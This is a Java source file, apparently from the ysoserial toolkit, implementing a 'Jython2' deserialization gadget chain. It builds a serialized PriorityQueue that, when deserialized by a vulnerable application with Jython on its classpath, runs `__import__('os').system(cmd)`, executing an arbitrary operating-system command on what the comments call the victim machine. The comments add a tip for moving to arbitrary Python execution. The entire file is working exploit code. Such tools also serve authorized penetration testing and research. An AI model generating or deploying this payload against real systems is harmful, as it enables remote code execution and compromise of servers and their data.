package ysoserial.payloads;

import org.python.core.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.HashMap;
import java.util.PriorityQueue;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

/**
 * Credits: Steven Seeley (@steventseeley) and Rocco Calvi (@TecR0c)
 * Thanks to Alvaro Munoz (@pwntester) for the InvocationHandler tekniq!
 *
 * This version of Jython2 executes python2 code on the victim machine. Note that we are in a Py.eval here
 * so if you want to jump to native python2 code you will need to move to Py.exec and to do that you can use
 * `__import__('code').InteractiveInterpreter().runcode(<python2 code>)` instead.
 *
 * java.io.ObjectInputStream.readObject
 *   java.util.PriorityQueue.readObject
 *       java.util.PriorityQueue.heapify
 *           java.util.PriorityQueue.siftDownUsingComparator
 *               com.sun.proxy.$Proxy4.compare
 *                   org.python.core.PyMethod.invoke
 *                       org.python.core.PyMethod.__call__
 *                           org.python.core.PyMethod.instancemethod___call__
 *                               org.python.core.PyObject.__call__
 *                                   org.python.core.PyBuiltinFunctionNarrow.__call__
 *                                       org.python.core.BuiltinFunctions.__call__
 *                                           org.python.core.__builtin__.eval
 *                                               org.python.core.Py.runCode
 */

@PayloadTest(skip="non RCE")
@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@Dependencies({ "org.python:jython-standalone:2.7.3" })
@Authors({ Authors.SSEELEY, Authors.RCALVI })
public class Jython2 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
    public PriorityQueue getObject(String command) throws Exception {
        Class<?> BuiltinFunctionsclazz = Class.forName("org.python.core.BuiltinFunctions");
        Constructor<?> c = BuiltinFunctionsclazz.getDeclaredConstructors()[0];
        c.setAccessible(true);
        Object builtin = c.newInstance("rce", 18, 1);
        PyMethod handler = new PyMethod((PyObject)builtin, null, new PyString().getType());
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        HashMap<Object, PyObject> myargs = new HashMap<Object, PyObject>();
        myargs.put("cmd", new PyString(command));
        PyStringMap locals = new PyStringMap(myargs);
        Object[] queue = new Object[] {
            new PyString("__import__('os').system(cmd)"), // attack
            locals,                                       // context
        };
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);
        return priorityQueue;
    }
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jython2.class, args);
    }
}
